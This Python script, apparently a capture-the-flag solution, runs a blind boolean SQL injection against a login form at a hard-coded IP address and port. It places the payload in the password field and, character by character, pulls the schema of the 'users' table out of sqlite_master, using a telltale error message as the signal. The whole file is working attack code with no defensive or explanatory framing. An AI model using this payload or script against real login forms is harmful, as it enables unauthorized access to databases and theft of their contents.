import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://95.216.233.106:24177',
    'Connection': 'keep-alive',
    'Referer': 'http://95.216.233.106:24177/sign-in',
    'Upgrade-Insecure-Requests': '1',
}

# Lower
valid1 = [ chr(n) for n in list(range(97, 123))]
# Numbers
valid2 = [ chr(n) for n in list(range(48, 57))]
# Upper
# valid3 = [ chr(n) for n in list(range(65, 91))]

valid = valid1 + valid2 + ['_'] + ['$'] + ['{'] + ['}']

sofar = ""

# For each letter
for pos in range(54,100):

    # For each char in list
    for i in range(48, 123):

        found_ch = ""
        current_ch = chr(i)

        #if (i >= ord(':') and i <= ord('@')) or (i > ord('Z') and i <= 96):
        if (i >= ord(':') and i <= 96):
            found_ch = current_ch
            continue

        data = {
          'user': 'admin',
          'pass': "' or (SELECT lower(substr(sql, "+ str(pos) +", 1)) FROM sqlite_master WHERE type='table' and tbl_name = 'users')='"+ current_ch +"' or '1'='2" 
        }

        response = requests.post('http://95.216.233.106:24177/sign-in', headers=headers, data=data)
        
        if response.text.find('Attempting to login as more than one user') > 0:
            found_ch = current_ch
            sofar += current_ch
            print('--- FOUND: ' + current_ch)
            print('--- SOFAR: ' + sofar)
            print('\n\n')
            break
        else:
            print('NOT: ' + current_ch)

    if found_ch == '':
        print('NOT FOUND or END')
        print('USERNAME: ' + sofar)
        break

print("================> Final: " + sofar)
